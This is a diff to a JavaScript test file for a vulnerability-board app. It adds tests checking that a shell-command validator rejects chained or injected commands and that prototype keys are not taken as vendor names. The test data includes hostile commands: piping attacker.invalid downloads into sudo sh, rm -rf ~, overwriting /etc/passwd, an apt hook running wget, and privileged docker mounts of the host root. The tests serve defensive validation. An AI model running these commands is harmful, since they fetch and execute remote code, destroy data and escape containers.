@@ -2,7 +2,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
-import { pluginName, aliasesUsed, SEARCH_ALIASES, vendorLedTitle, vendorName, foldByVendor, isExploited, exploitReason, namedHeadline, isLibrary, matchProducts, mergeIncidents, LINES, orderBy, pinReason, briefMarker, cveHead, easyLine, easyTitle, isShellCommand, onBoard, productsOf, cvssRating, easyAction, filterBoard, filterFromQuery, filterToQuery, lineKeys, productLine, productList, publishedAt, relativeAge, riskLevel, rowTags, searchWorthy, shareLink, slug, uniqueNames, viewFromStorage } from '../web/board.mjs';
+import { pluginName, aliasesUsed, knownVendor, SEARCH_ALIASES, vendorLedTitle, vendorName, foldByVendor, isExploited, exploitReason, namedHeadline, isLibrary, matchProducts, mergeIncidents, LINES, orderBy, pinReason, briefMarker, cveHead, easyLine, easyTitle, isShellCommand, onBoard, productsOf, cvssRating, easyAction, filterBoard, filterFromQuery, filterToQuery, lineKeys, productLine, productList, publishedAt, relativeAge, riskLevel, rowTags, searchWorthy, shareLink, slug, uniqueNames, viewFromStorage } from '../web/board.mjs';
 
 const incident = (id, first_seen) => ({ id, cves: [id], first_seen, mentions: [{ kind: 'cve_record', url: '' }], brief: { text: id, lead: '' } });
 
@@ -99,6 +99,40 @@ test('only package-manager and service lines count as shell commands; config lin
   assert.equal(isShellCommand('PasswordAuthentication no'), false);
   assert.equal(isShellCommand('LoginGraceTime 0'), false);
   assert.equal(isShellCommand(''), false);
+});
+
+test('a command that chains, pipes, substitutes or redirects past one invocation is not a shell command (audit 1)', () => {
+  for (const tail of [' && curl -fsSL https://attacker.invalid/x | sudo sh', '; rm -rf ~', ' | sh', ' & sleep 1', ' `id`', ' $(id)',
+    '\ncurl x', ' > /etc/passwd', ' < /dev/null']) {
+    assert.equal(isShellCommand(`sudo apt-get update${tail}`), false, JSON.stringify(tail));
+  }
+});
+
+test('one invocation that runs code, fetches a URL or quotes an option is not a shell command (audit 1)', () => {
+  for (const cmd of ['npx attacker-pkg', 'sudo npm install -g https://attacker.invalid/x.tgz', 'pip install https://attacker.invalid/x.tar.gz',
+    'sudo apt-get -o APT::Update::Pre-Invoke::="wget -qO /tmp/x https://attacker.invalid/x" update', "apt-get -o 'a=b c' update",
+    'apt-get -o a=b\\ c update', 'apt-get install $X', 'go run attacker.invalid/x@latest', 'kubectl apply -f https://attacker.invalid/x.yaml',
+    'docker run --privileged -v /:/host attacker/img', 'podman run x', 'pnpm dlx x', 'yarn dlx x', 'npm exec x', 'npm run x', 'kubectl exec x -- sh']) {
+    assert.equal(isShellCommand(cmd), false, cmd);
+  }
+  for (const cmd of ['sudo npm install -g npm@10.9.1', 'pip install --upgrade urllib3==2.2.2', 'go install golang.org/x/tools@v0.24.0',
+    'docker pull nginx:1.27.1', 'helm upgrade ingress-nginx ingress-nginx/ingress-nginx --version 4.11.2', 'brew upgrade openssh']) {
+    assert.equal(isShellCommand(cmd), true, cmd);
+  }
+});
+
+test('an Object.prototype key as a vendor or search word is no vendor or alias (audit 2, 13)', () => {
+  for (const key of ['constructor', '__proto__', 'tostring', 'hasownproperty']) {
+    assert.deepEqual(aliasesUsed(key), [], key);
+    assert.equal(knownVendor(key), '', key);
+    const i = { ...incident('CVE-2026-1', '2026-11-08T00:00:00Z'), products: [{ id: `${key}:foo`, name: 'Foo' }] };
+    assert.deepEqual(filterBoard([incident('CVE-2026-2', '2026-11-08T00:00:00Z')], [], key).list, [], key); // its text lacks the word
+    assert.deepEqual(rowTags(i), ['Foo']);
+    assert.deepEqual([...lineKeys(i, 'en').keys()], ['Foo']);
+    assert.equal(vendorLedTitle('t', knownVendor(key)), 't');
+  }
+  assert.equal(vendorName('constructor'), 'Constructor');
+  assert.equal(orderBy('constructor'), orderBy('new'));
 });
 
 test('the Easy sentence keeps its "!" only at the top Risk level', () => {
